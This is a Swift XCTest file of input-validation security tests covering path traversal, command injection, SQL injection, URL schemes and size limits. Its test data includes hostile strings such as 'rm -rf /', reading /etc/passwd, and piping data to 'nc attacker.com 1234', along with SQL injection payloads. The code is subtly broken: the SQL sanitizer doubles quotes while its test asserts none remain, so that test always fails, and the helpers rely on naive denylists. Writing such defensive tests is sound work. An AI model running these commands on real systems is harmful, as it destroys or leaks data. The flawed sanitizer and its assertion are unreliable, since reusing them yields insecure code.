import XCTest
import Foundation

/// Security Tests: Input Validation and Sanitization
class InputValidationTests: XCTestCase {

    // MARK: - Path Traversal Tests

    func testPathTraversalDetection() {
        // Test cases that should be rejected
        let maliciousPaths = [
            "../etc/passwd",
            "../../sensitive/data",
            "./../config",
            "valid/../../../etc/shadow",
            "..\\..\\windows\\system32"
        ]

        for path in maliciousPaths {
            XCTAssertFalse(isPathSafe(path),
                          "Path traversal not detected: \(path)")
        }

        // Test cases that should be allowed
        let safePaths = [
            "documents/file.txt",
            "user/data.json",
            "./local/file"
        ]

        for path in safePaths {
            XCTAssertTrue(isPathSafe(path),
                         "Safe path rejected: \(path)")
        }
    }

    func testAbsolutePathValidation() {
        let testPath = "/tmp/test"
        XCTAssertTrue(testPath.starts(with: "/"),
                     "Absolute path validation failed")
    }

    // MARK: - Command Injection Tests

    func testCommandInjectionDetection() {
        let maliciousCommands = [
            "file.txt; rm -rf /",
            "data.json && cat /etc/passwd",
            "file | nc attacker.com 1234",
            "input$(whoami)",
            "file`ls -la`"
        ]

        for command in maliciousCommands {
            XCTAssertFalse(isCommandSafe(command),
                          "Command injection not detected: \(command)")
        }
    }

    // MARK: - SQL Injection Tests (if database used)

    func testSQLInjectionDetection() {
        let maliciousInputs = [
            "'; DROP TABLE users--",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM passwords--"
        ]

        for input in maliciousInputs {
            let sanitized = sanitizeSQLInput(input)
            XCTAssertFalse(sanitized.contains("'"),
                          "SQL injection characters not escaped: \(input)")
        }
    }

    // MARK: - Integer Overflow Tests

    func testIntegerOverflowProtection() {
        let maxInt = Int.max
        let result = maxInt.addingReportingOverflow(1)

        XCTAssertTrue(result.overflow,
                     "Integer overflow not detected")
    }

    func testMemorySizeValidation() {
        // Test reasonable memory allocations
        let validSizes: [UInt64] = [
            1024 * 1024 * 512,      // 512 MB
            1024 * 1024 * 1024 * 4  // 4 GB
        ]

        for size in validSizes {
            XCTAssertTrue(isMemorySizeValid(size),
                         "Valid memory size rejected: \(size)")
        }

        // Test unreasonable memory allocations
        let invalidSizes: [UInt64] = [
            0,                           // Zero allocation
            1024 * 1024 * 1024 * 1024   // 1 TB (too large)
        ]

        for size in invalidSizes {
            XCTAssertFalse(isMemorySizeValid(size),
                          "Invalid memory size accepted: \(size)")
        }
    }

    // MARK: - URL Validation Tests

    func testURLValidation() {
        // Valid HTTPS URLs
        let validURLs = [
            "https://example.com",
            "https://api.github.com/repos",
            "https://127.0.0.1:8080"
        ]

        for urlString in validURLs {
            XCTAssertTrue(isURLSecure(urlString),
                         "Secure URL rejected: \(urlString)")
        }

        // Invalid URLs
        let insecureURLs = [
            "http://example.com",  // HTTP not HTTPS
            "file:///etc/passwd",  // File protocol
            "javascript:alert(1)", // JavaScript protocol
            "ftp://files.com"      // FTP protocol
        ]

        for urlString in insecureURLs {
            XCTAssertFalse(isURLSecure(urlString),
                          "Insecure URL accepted: \(urlString)")
        }
    }

    // MARK: - String Length Validation

    func testStringLengthLimits() {
        let maxLength = 1000

        // Valid length
        let validString = String(repeating: "a", count: 500)
        XCTAssertTrue(isStringLengthValid(validString, maxLength: maxLength),
                     "Valid string length rejected")

        // Excessive length (DoS attempt)
        let oversizedString = String(repeating: "a", count: 10000)
        XCTAssertFalse(isStringLengthValid(oversizedString, maxLength: maxLength),
                      "Oversized string accepted")
    }

    // MARK: - Helper Functions

    private func isPathSafe(_ path: String) -> Bool {
        // Check for path traversal patterns
        let dangerous = ["../", "..\\", "..", "%2e%2e"]
        for pattern in dangerous {
            if path.contains(pattern) {
                return false
            }
        }
        return true
    }

    private func isCommandSafe(_ command: String) -> Bool {
        // Check for command injection patterns
        let dangerous = [";", "&&", "||", "|", "`", "$", "(", ")", "<", ">"]
        for char in dangerous {
            if command.contains(char) {
                return false
            }
        }
        return true
    }

    private func sanitizeSQLInput(_ input: String) -> String {
        // Escape single quotes for SQL
        return input.replacingOccurrences(of: "'", with: "''")
    }

    private func isMemorySizeValid(_ size: UInt64) -> Bool {
        let minSize: UInt64 = 1024 * 1024 * 128  // 128 MB minimum
        let maxSize: UInt64 = 1024 * 1024 * 1024 * 16  // 16 GB maximum
        return size >= minSize && size <= maxSize
    }

    private func isURLSecure(_ urlString: String) -> Bool {
        guard let url = URL(string: urlString) else {
            return false
        }

        // Only allow HTTPS (or localhost HTTP for development)
        if url.scheme == "https" {
            return true
        }

        if url.scheme == "http" && (url.host == "localhost" || url.host == "127.0.0.1") {
            return true
        }

        return false
    }

    private func isStringLengthValid(_ string: String, maxLength: Int) -> Bool {
        return string.count <= maxLength && string.count > 0
    }
}
